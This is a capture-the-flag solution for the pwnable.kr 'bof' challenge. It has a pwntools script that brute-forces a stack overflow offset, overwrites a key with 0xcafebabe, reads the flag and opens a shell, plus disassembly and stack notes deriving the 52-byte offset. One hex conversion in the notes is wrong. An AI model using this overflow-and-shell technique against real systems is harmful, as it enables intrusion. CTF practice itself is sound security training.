#BOF-pwnable.kr :)
#This contains two methods. First One is Brute-Force ! Second One is actual Way
from pwn import *


for i in range(32,133):
        p= remote("pwnable.kr","9000")
        p.sendline("A"*i+"\xca\xfe\xba\xbe"[::-1])
        p.sendline("cat ./flag")
        e=(p.recv())

        print(i,e)
        if '*** stack smashing detected ***' not in e:
                print("OFFSET is ",i)
                p.sendline("cat ./flag")
                p.interactive()
                break
                
                
#Right Solution Without Bruteforce                
                        lea    eax,[ebp-0x2c]
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe                


Buffer Size :44bytes
Base Pointer:4bytes
Now we are in ebp <--
Check is at DWORD PTR [ebp+0x8]  so add 4 bytes junk <--
So The Offset is 52  
The value affter offset 52  will be ebp+0x8. This check will satisify

|-------------------------------------| 
|       Stack                         |
|-------------------------------------|
|  Main Function                      |                                          
|   int key                           | -------------------------->$ebp+0x8 Check Made
|-------------------------------------|
|    return address-offset 4  bytes   | --------------------------->Return Address
|    push EBP-offset 4 bytes          |---------------------------> $ebp
|-------------------------------------|
|    overflowme[32] -offset 44        | --------------------------->$ebp-0x2c Buffer Location
|-------------------------------------|

gdb-peda$ p 0x2c+0x8
$3 = 0x34
0x32=52(Decimal)
